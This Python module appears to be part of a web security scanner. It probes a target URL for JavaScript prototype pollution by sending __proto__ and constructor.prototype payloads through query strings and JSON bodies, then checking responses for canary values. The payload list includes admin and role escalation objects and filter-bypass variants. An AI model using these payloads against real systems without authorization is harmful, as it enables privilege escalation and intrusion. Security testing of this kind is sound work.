"""
WSHawk Proto Polluter Engine
Tests web applications for JavaScript Prototype Pollution vulnerabilities
by injecting __proto__ and constructor.prototype payloads into query
parameters and JSON request bodies.
"""

import aiohttp
import asyncio
import json
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from typing import Dict, Any, List


# Prototype pollution injection payloads
PP_PAYLOADS = {
    "Query Parameter": [
        # Classic __proto__ injection via query
        ("__proto__[polluted]", "wshawk_pp_test"),
        ("__proto__.polluted", "wshawk_pp_test"),
        ("constructor[prototype][polluted]", "wshawk_pp_test"),
        ("constructor.prototype.polluted", "wshawk_pp_test"),

        # Nested property pollution
        ("__proto__[toString]", "wshawk_pp_test"),
        ("__proto__[valueOf]", "wshawk_pp_test"),
        ("__proto__[hasOwnProperty]", "wshawk_pp_test"),

        # URL encoding bypasses
        ("__pro__proto__to__[polluted]", "wshawk_pp_test"),  # filter bypass
        ("__proto__%5Bpolluted%5D", "wshawk_pp_test"),
    ],
    "JSON Body": [
        # Standard JSON prototype pollution
        {"__proto__": {"polluted": "wshawk_pp_test"}},
        {"constructor": {"prototype": {"polluted": "wshawk_pp_test"}}},

        # Deep merge pollution
        {"__proto__": {"isAdmin": True}},
        {"__proto__": {"role": "admin"}},
        {"__proto__": {"status": 200}},
        {"constructor": {"prototype": {"isAdmin": True}}},

        # Nested object pollution
        {"a": {"__proto__": {"polluted": "wshawk_pp_test"}}},
        {"a": {"constructor": {"prototype": {"polluted": "wshawk_pp_test"}}}},
    ],
}

# Indicators that pollution succeeded
PP_INDICATORS = [
    r"wshawk_pp_test",           # Our canary value appeared in response
    r"\"polluted\"",              # Polluted key visible in response
    r"\"isAdmin\"\s*:\s*true",   # Admin escalation
    r"\"role\"\s*:\s*\"admin\"", # Role escalation
    r"prototype",                 # Prototype keyword reflected
    r"\[object Object\]",        # Object.prototype.toString corrupted
]


class WSHawkProtoPolluter:
    """
    Tests web applications for Prototype Pollution vulnerabilities.

    Injects __proto__ and constructor.prototype payloads into query
    parameters and JSON request bodies, then checks if the pollution
    propagated by looking for indicator values in responses.

    Features:
        - Query parameter pollution testing
        - JSON body deep merge pollution
        - Admin/role escalation payloads
        - Filter bypass techniques
        - Response diffing (compares baseline vs polluted responses)
        - Real-time Socket.IO findings
    """

    def __init__(self, sio_instance=None):
        self.sio = sio_instance

    async def test(
        self, url: str, method: str = "GET",
        body: str = "", content_type: str = "",
    ) -> Dict[str, Any]:
        """
        Test a URL for prototype pollution vulnerabilities.

        Args:
            url: Target URL.
            method: HTTP method (GET for query, POST for body).
            body: JSON request body.
            content_type: Content-Type header.

        Returns:
            Dict with 'findings', 'tests_run', and analysis.
        """
        if not url or not url.strip():
            raise ValueError("URL is required")

        url = url.strip()
        if not url.startswith(("http://", "https://")):
            url = "https://" + url

        start = time.time()
        findings: List[Dict] = []
        tests_run = 0

        # Get baseline response
        baseline = await self._fetch(url, method, body, content_type)
        baseline_body = baseline.get("body", "")
        baseline_length = len(baseline_body)

        # ── Test 1: Query parameter pollution ──
        parsed = urlparse(url)
        query_payloads = PP_PAYLOADS["Query Parameter"]

        sem = asyncio.Semaphore(3)  # Lower concurrency for pollution tests

        async def _test_query(param_key: str, param_val: str):
            nonlocal tests_run
            async with sem:
                tests_run += 1

                # Add payload as query parameter
                existing = parse_qs(parsed.query, keep_blank_values=True)
                existing[param_key] = [param_val]
                new_query = urlencode(existing, doseq=True)
                test_url = urlunparse((
                    parsed.scheme, parsed.netloc, parsed.path,
                    parsed.params, new_query, parsed.fragment
                ))

                try:
                    resp = await self._fetch(test_url, "GET", "", "")
                    indicators = self._check_indicators(resp.get("body", ""))

                    # Also check for response difference
                    resp_len = len(resp.get("body", ""))
                    len_diff = abs(resp_len - baseline_length)
                    significant_diff = len_diff > 50

                    if indicators or significant_diff:
                        severity = "High" if indicators else "Medium"
                        finding = {
                            "vector": "Query Parameter",
                            "payload": f"{param_key}={param_val}",
                            "severity": severity,
                            "indicators": indicators,
                            "response_diff": len_diff,
                            "status": resp.get("status", 0),
                        }
                        findings.append(finding)

                        if self.sio:
                            await self.sio.emit("pp_finding", finding)

                except Exception:
                    pass

        # ── Test 2: JSON body pollution ──
        async def _test_json(payload_obj: dict, desc: str):
            nonlocal tests_run
            async with sem:
                tests_run += 1

                # Merge payload into existing body or send standalone
                if body:
                    try:
                        existing = json.loads(body)
                        merged = {**existing, **payload_obj}
                    except json.JSONDecodeError:
                        merged = payload_obj
                else:
                    merged = payload_obj

                try:
                    resp = await self._fetch(
                        url, "POST", json.dumps(merged), "application/json"
                    )
                    indicators = self._check_indicators(resp.get("body", ""))

                    resp_len = len(resp.get("body", ""))
                    len_diff = abs(resp_len - baseline_length)
                    significant_diff = len_diff > 50

                    if indicators or significant_diff:
                        severity = "High" if indicators else "Medium"
                        finding = {
                            "vector": "JSON Body",
                            "payload": json.dumps(payload_obj)[:120],
                            "severity": severity,
                            "indicators": indicators,
                            "response_diff": len_diff,
                            "status": resp.get("status", 0),
                        }
                        findings.append(finding)

                        if self.sio:
                            await self.sio.emit("pp_finding", finding)

                except Exception:
                    pass

        # Run query tests
        tasks = []
        for key, val in query_payloads:
            tasks.append(_test_query(key, val))

        # Run JSON tests
        for payload_obj in PP_PAYLOADS["JSON Body"]:
            desc = json.dumps(payload_obj)[:60]
            tasks.append(_test_json(payload_obj, desc))

        await asyncio.gather(*tasks)

        elapsed = round(time.time() - start, 2)

        return {
            "url": url,
            "findings": findings,
            "total_findings": len(findings),
            "tests_run": tests_run,
            "baseline_length": baseline_length,
            "elapsed": elapsed,
        }

    async def _fetch(
        self, url: str, method: str, body: str, content_type: str
    ) -> Dict[str, Any]:
        """Fetch URL and return response data."""
        headers = {}
        if content_type:
            headers["Content-Type"] = content_type

        timeout = aiohttp.ClientTimeout(total=8)
        try:
            async with aiohttp.ClientSession() as session:
                async with session.request(
                    method or "GET", url, data=body if body else None,
                    headers=headers, ssl=False, allow_redirects=True,
                    timeout=timeout
                ) as resp:
                    text = await resp.text(errors='ignore')
                    return {
                        "status": resp.status,
                        "body": text[:5000],
                        "headers": dict(resp.headers),
                    }
        except Exception as e:
            return {"status": 0, "body": "", "headers": {}, "error": str(e)}

    def _check_indicators(self, body: str) -> List[str]:
        """Check response for prototype pollution success indicators."""
        hits = []
        for pattern in PP_INDICATORS:
            if re.search(pattern, body, re.IGNORECASE):
                hits.append(pattern)
        return hits[:5]
